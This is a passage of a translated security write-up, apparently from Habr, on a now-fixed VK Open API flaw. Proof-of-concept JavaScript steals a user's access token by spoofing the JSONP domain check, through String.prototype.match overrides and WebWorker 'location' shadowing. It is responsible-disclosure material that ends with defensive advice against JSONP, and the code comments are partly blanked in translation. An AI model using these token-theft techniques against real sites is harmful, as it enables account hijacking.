</span></span></span><span class="javascript">{ </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (data.access_token) { App.ready = </span><span class="hljs-literal"><span class="javascript"><span class="hljs-literal">true</span></span></span><span class="javascript">; App.access_token = data.access_token; App.first_name = data.user.first_name; App.last_name = data.user.last_name; App.user_id = data.user.id; } App.init(); } } } }, App = { </span><span class="hljs-attr"><span class="javascript"><span class="hljs-attr">_original_match_method</span></span></span><span class="javascript">: </span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">String</span></span></span><span class="javascript">.prototype.match, </span><span class="hljs-attr"><span class="javascript"><span class="hljs-attr">_restoreOriginalMatch</span></span></span><span class="javascript">: </span><span class="hljs-function"><span class="hljs-keyword"><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span></span><span class="javascript"><span class="hljs-function"> (</span></span><span class="hljs-params"></span><span class="javascript"><span class="hljs-function"><span class="hljs-params"></span>) </span></span></span><span class="javascript">{ </span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">String</span></span></span><span class="javascript">.prototype.match = </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">this</span></span></span><span class="javascript">._original_match_method; }, </span><span class="hljs-attr"><span class="javascript"><span class="hljs-attr">init</span></span></span><span class="javascript">: </span><span class="hljs-function"><span class="hljs-keyword"><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span></span><span class="javascript"><span class="hljs-function"> (</span></span><span class="hljs-params"></span><span class="javascript"><span class="hljs-function"><span class="hljs-params"></span>) </span></span></span><span class="javascript">{ </span><span class="hljs-comment"><span class="javascript"><span class="hljs-comment">//   String.prototype.match() this._restoreOriginalMatch(); if (this.ready) { //  , , ID  Access Token'a  //    . } else { //      www.example.com,   //  VK    . } } }; //   : // 'any string'.match(/https?:\/\/www\.mysite\.com\//) // true // 'any string'.match(/.*/) // ['any string'] (function () { var original_match = String.prototype.match; String.prototype.match = function () { // ,      -,   -  . return arguments[0] == '/https?:\\/\\/www\\.mysite\\.com\\//' ? true : original_match.apply(this, arguments); } })(); </span></span></span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://login.vk.com/?act=openapi&amp;oauth=1&amp;aid=1234567&amp;location=www.example.com&amp;rnd=456"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="undefined"></span><span class="hljs-tag"><span class="undefined"></span><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  By sending all this I waited. <br><br><h3>  Moving to a new level: WebWorkers </h3><br>  Some time after I sent the last demo, the vulnerability was fixed.  And again, I decided to try to figure out how to fix the vulnerability. <br><br>  As before, to get the Access Token of the user, a JSONP request was made to the VK server, and the response was still the same reconciliation of the current domain with the VK application domain: <br><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">/* &lt;html&gt;&lt;script&gt;window.location='http://vk.com';&lt;/script&gt;&lt;/html&gt; */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ( location.href !== (location.protocol == <span class="hljs-string"><span class="hljs-string">'https:'</span></span> ? <span class="hljs-string"><span class="hljs-string">'https'</span></span> : <span class="hljs-string"><span class="hljs-string">'http'</span></span>) + <span class="hljs-string"><span class="hljs-string">'://www.example.com'</span></span> + (location.port ? <span class="hljs-string"><span class="hljs-string">':'</span></span> + location.port : <span class="hljs-string"><span class="hljs-string">''</span></span>) + <span class="hljs-string"><span class="hljs-string">'/'</span></span> + location.pathname.slice(<span class="hljs-number"><span class="hljs-number">1</span></span>) + location.search + location.hash ) { <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.location.href = <span class="hljs-string"><span class="hljs-string">'http://vk.com/oauth'</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (;;); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { VK.Auth.lsCb[<span class="hljs-number"><span class="hljs-number">456</span></span>]({ <span class="hljs-string"><span class="hljs-string">"auth"</span></span>: <span class="hljs-literal"><span class="hljs-literal">true</span></span>, <span class="hljs-string"><span class="hljs-string">"access_token"</span></span>: <span class="hljs-string"><span class="hljs-string">"512aae7f9e9070f3bbb1600b934238546e4567892q2fj29739242e2b66521da110fdf5nmj9fee6ce8"</span></span>, <span class="hljs-string"><span class="hljs-string">"expire"</span></span>: <span class="hljs-number"><span class="hljs-number">1438739486</span></span>, <span class="hljs-string"><span class="hljs-string">"time"</span></span>: <span class="hljs-number"><span class="hljs-number">7200</span></span>, <span class="hljs-string"><span class="hljs-string">"sig"</span></span>: <span class="hljs-string"><span class="hljs-string">"53aa7a11c2431d96v8765e1b3c7q2c22"</span></span>, <span class="hljs-string"><span class="hljs-string">"secret"</span></span>: <span class="hljs-string"><span class="hljs-string">"oauth"</span></span>, <span class="hljs-string"><span class="hljs-string">"user"</span></span>: { <span class="hljs-string"><span class="hljs-string">"id"</span></span>: <span class="hljs-string"><span class="hljs-string">"%ID_%"</span></span>, <span class="hljs-string"><span class="hljs-string">"domain"</span></span>: <span class="hljs-string"><span class="hljs-string">"%_%"</span></span>, <span class="hljs-string"><span class="hljs-string">"href"</span></span>: <span class="hljs-string"><span class="hljs-string">"https:\/\/vk.com\/%__id_%"</span></span>, <span class="hljs-string"><span class="hljs-string">"first_name"</span></span>: <span class="hljs-string"><span class="hljs-string">"%%"</span></span>, <span class="hljs-string"><span class="hljs-string">"last_name"</span></span>: <span class="hljs-string"><span class="hljs-string">"%%"</span></span>, <span class="hljs-string"><span class="hljs-string">"nickname"</span></span>: <span class="hljs-string"><span class="hljs-string">""</span></span> } }); }</code> </pre><br>  The check seems flawless because  To obtain the current domain, a NOT configurable field <code>location.href</code> (i.e. getter / setter cannot be hung on it).  How many do not try, it seems, in the environment of the browser's UI-stream (where the global object is a <code>window</code> ) <code>location</code> cannot be changed ... But we still have the WebWorker environment!  After checking your guess, it became clear that in the Worker's environment ( <code>DedicatedWorkerGlobalScope</code> ) the <code>location</code> field of the <code>self</code> object can simply be covered with an object with the fields <code>href</code> , <code>hostname</code> , etc. Why?  It's simple: the <code>location</code> object is not in the <code>self</code> object itself, but in its prototype, so the <code>var location = {};</code> instruction <code>var location = {};</code>  performed in Worker's global scope, or <code>Object.defineProperty(self, 'location', {value: ... })</code> simply overlap the <code>location</code> from the prototype of the <code>self</code> object (that is, adds to the <code>self</code> object <i>its own</i> <code>location</code> <i>field</i> ).  Thus, the code that will be loaded via <code>self.importScripts()</code> when accessing the <code>location</code> will receive our object, not the original one.  By the way, in the browser's UI environment such a trick will not work: there the <code>location</code> object is implemented as <i>its own field</i> of the <code>window</code> object, which you can‚Äôt block by anything. <br><br>  A small example of how this works: <br><br><pre> <code class="html hljs xml"><span class="hljs-meta"><span class="hljs-meta">&lt;!doctype html&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">title</span></span></span><span class="hljs-tag">&gt;</span></span>Workers<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">title</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">meta</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">charset</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"utf-8"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="actionscript"><span class="actionscript"> (</span><span class="hljs-function"><span class="hljs-keyword"><span class="actionscript"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span></span><span class="actionscript"><span class="hljs-function"> </span></span><span class="hljs-params"><span class="actionscript"><span class="hljs-function"><span class="hljs-params">()</span></span></span></span><span class="actionscript"><span class="hljs-function"> </span></span></span><span class="actionscript">{ </span><span class="hljs-keyword"><span class="actionscript"><span class="hljs-keyword">var</span></span></span><span class="actionscript"> worker, </span><span class="hljs-comment"><span class="actionscript"><span class="hljs-comment">//       ,   Worker'. //  ,       , //        . worker_code = (function () { //   location var location = { // URL ,    href: 'http://www.example.com/', search: '', hash: '', pathname: '' }, VK = { Auth: { lsCb: { //  -   access_token' 456: function (data) { //  UI-   self.postMessage(data); } } } }; //    Access Token'  (   ). //   , -  42-  Chrome,    importScripts() //   Refferer,    Worker'  ObjectURL, //    .   referrer     ,   //      VK. importScripts('https://login.vk.com/?act=openapi&amp;oauth=1&amp;aid=1234567&amp;location=www.example.com&amp;rnd=456'); }).toString(); //      "function () {"  ,  "}"   worker_code = worker_code.substring(worker_code.indexOf('{') + 1, worker_code.length - 1); worker = new Worker( //  ObjectURL,         Worker'a URL.createObjectURL( new Blob([worker_code], {type: 'application/javascript'}) ) ); worker.addEventListener('message', function (e) { if (e.data.auth) { alert(e.data.access_token); } else { alert('  VK   www.example.com    '); } }, false); }()); </span></span></span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  Thus, we have the ability to replace the JS API more abruptly than in the UI stream.  Having made all this ‚Äúinteresting,‚Äù I waited for an answer.  After a while, the vulnerable code in openapi.js was fixed.  Now, to get Access Token, the library makes a cross-domain query on the backend of VK using the technology of <a href="https://ru.wikipedia.org/wiki/Cross-origin_resource_sharing">Cross-origin resource sharing</a> . <br><br><h3>  In an interesting way </h3><br>  After sending the first two demos, it seemed to me that it was somehow wrong to implement the demo in the form of a simple display to the user Access Token'a ... And after some hesitation, I decided to make a patch for the VK Open API library (http://vk.com/js /api/openapi.js) so that she herself knows how to exploit the vulnerability. <br><br>  What eventually happened: <br><br><pre> <code class="html hljs xml"><span class="hljs-meta"><span class="hljs-meta">&lt;!doctype html&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!--  VK Open Api --&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://vk.com/js/api/openapi.js"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="undefined"></span><span class="hljs-tag"><span class="undefined"></span><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!--  ,     openapi.js    VK API   ,     . ..     ,    . . --&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"vk_opanapi_insecure_patch.js"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="undefined"></span><span class="hljs-tag"><span class="undefined"></span><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="actionscript"><span class="actionscript"> VK.init({ </span><span class="hljs-comment"><span class="actionscript"><span class="hljs-comment">//   - ID VK  apiId: 1234567, //   vk_opanapi_insecure_patch.js,  openapi.js  , //  JSONP-   Access Token'    Worker'a, //   UI-      . appDomain: 'www.example.com' }); //       "appDomain", //     API     ID "1234567"  , //        "www.example.com". VK.Api.call('users.get', {}, function(r) { if(r.response) { alert(' : ' + r.response[0].first_name + ' ' + r.response[0].last_name); } }); </span></span></span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  <a href="https://drive.google.com/file/d/0B8mwJU8Ya6USQXoydlFxOS0teEE/view%3Fusp%3Dsharing">Link to the archive</a> . <br><br><h3>  findings </h3><br>  Sometimes the tool that you use for a long time, surprises.  Sometimes in the form of serious vulnerabilities.  However, there is a general rule: never pass sensitive data through JSONP.  Even when the validation code of the recipient of the JSONP response seems flawless, it turns out that you can replace the JS browser environment (BOM) so that the entire check before passing the token to the page code is reduced to nothing.  In general, it's time to abandon JSONP in favor of CORS. <br><br>  In this publication, I in no way wanted to put the VK Open API developers in a bad light.  On the contrary: the guys are great, they are developing a cool service, on cool technologies with excellent documentation and support service.  And everyone can make a mistake.  The main reason why I decided to write an article was the desire to warn web developers against such errors. <br><br>  Basically, that's all.  I planned to describe the essence of vulnerability in several paragraphs, but after writing each paragraph I had a feeling of understatement.  So this has turned the veil of text. <br><br>  Thank you for attention! </div><p>Source: <a href="https://habr.com/ru/post/271031/">https://habr.com/ru/post/271031/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../271017/index.html">Different chips for office automation: intercoms, curtains, lighting, and so on</a></li>
<li><a href="../271019/index.html">Power Query: steroids for MS Excel and Power BI</a></li>
<li><a href="../271021/index.html">Why does WhatsApp collect and store confidential information about the user and their conversations?</a></li>
<li><a href="../271023/index.html">Data transfer to Russia. Short FAQ on Misconceptions</a></li>
<li><a href="../271025/index.html">Spring 4 MVC, Hibernate: many to many association</a></li>
<li><a href="../271033/index.html">How to implement a SOAP service for working with Google tables through SQL</a></li>
<li><a href="../271035/index.html">LINQ converter between roman and arabic numbers</a></li>
<li><a href="../271037/index.html">EMC ViPR 2.1: Third Platform Data Management</a></li>
<li><a href="../271039/index.html">Overview of Cisco UCS Initial Setup</a></li>
<li><a href="../271041/index.html">We invite you to a meeting on web development on December 2</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>